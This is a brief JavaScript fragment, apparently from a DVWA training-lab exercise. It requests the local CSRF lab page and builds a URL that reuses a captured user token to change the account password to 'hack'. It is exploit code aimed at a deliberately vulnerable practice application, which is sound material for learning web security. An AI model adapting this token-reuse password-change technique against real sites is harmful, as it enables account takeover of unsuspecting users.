...
myGetRequest('http://127.0.0.1/dvwa/vulnerabilities/csrf/', (req, response) => {
    ...
    const passwd = 'hack';
    const hackUrl = `http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token=${token}&password_new=${passwd}&password_conf=${passwd}&Change=Change`;
